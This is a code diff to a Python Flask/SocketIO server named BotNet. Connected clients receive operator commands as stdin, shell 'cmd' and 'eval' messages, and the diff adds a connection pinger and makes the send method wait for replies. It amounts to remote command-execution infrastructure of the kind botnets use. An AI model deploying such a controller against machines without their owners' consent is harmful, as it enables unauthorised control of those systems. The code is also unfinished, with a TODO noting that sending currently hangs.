@@ -7,14 +7,12 @@ from flask_socketio import SocketIO, emit
 
 # Loading library depends on how we want to setup the project later,
 # for now this will do
-try: from server import byteutils
-except: import byteutils
+try:
+    from server import byteutils
+except:
+    import byteutils
 
-
-''' Sumner: if you are reading this I have only just got the main concept working,
-Looks pretty dope though so far.
-=======
-See accompanying README for TODOs.
+''' See accompanying README for TODOs.
 
  To run: python server.py'''
 
@@ -43,6 +41,7 @@ def index():
     return render_template('index.html', async_mode=socketio.async_mode, bot_list=allConnections.keys(),
                            connected=connected)
 
+
 @socketio.on('send_command', namespace='/bot')
 def send_receive(cmd):
     raw_output = ''
@@ -58,12 +57,6 @@ def send_receive(cmd):
         emit('response',
              {'stdout': stdout[:-1], 'stderr': stderr[:-1], 'user': connected})
 
-#TODO: not done
-@app.route("/", methods=['GET', 'POST'])
-def bot_selector():
-    select = request.form.get('bot')
-    connected = str(select)
-    print(connected)
 
 class BotNet(Thread):
     def __init__(self, tcpsock):
@@ -84,10 +77,25 @@ class BotNet(Thread):
             allConnections[user] = Bot(clientsock, host_info)
 
             # Testing: automatically sends "say hi" command
-            allConnections[user].sendStdin('say hi\n')
+            # allConnections[user].sendStdin('say hi\n')
 
 
-# TODO: can make this multi-threaded if want to send to multiple clients at once in the future
+# Background thread to check if we've lost any connections
+class BotPinger(Thread):
+    def run(self):
+        while True:
+            for bot in allConnections.values():
+                self.ping(bot)
+            time.sleep(60)  # checking every minute, this can be changed
+
+    def ping(self, bot):
+        # recv returns 0 if client disconnected
+        if not bot.sock.recv(1024):
+            del allConnections[bot.user]
+            socketio.emit('disconnect', {'user': bot.user}, namespace='/bot')
+            print("[-] Lost connection to {}".format(bot.user))
+
+
 class Bot:
     def __init__(self, sock, host_info):
         self.sock = sock
@@ -95,12 +103,17 @@ class Bot:
         self.user = host_info['user'][:-1]
 
     def send(self, cmd, type="stdin"):
-        json_str = json.dumps({type:cmd})
+        json_str = json.dumps({type: cmd})
         json_format = byteutils.formatBytes(json_str)
         self.sock.sendall(json_format)
 
+        # TODO: Sumner, need this to return result. Currently hangs.
+        recvbytes = byteutils.recvFormatBytes(self.sock)
+        recvjson = json.loads(recvbytes.decode('UTF-8'))
+        return recvjson
+
     def sendStdin(self, cmd):
-        self.send(cmd,type="stdin")
+        self.send(cmd, type="stdin")
 
     def sendCmd(self, cmd):
         self.send(cmd, type="cmd")
@@ -108,10 +121,12 @@ class Bot:
     def sendEval(self, cmd):
         self.send(cmd, type="eval")
 
+
 if __name__ == "__main__":
     TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     TCPSOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     TCPSOCK.bind((HOST, PORT))
     BotNet(TCPSOCK).start()
+    BotPinger().start()
 
     socketio.run(app, debug=True, use_reloader=False)
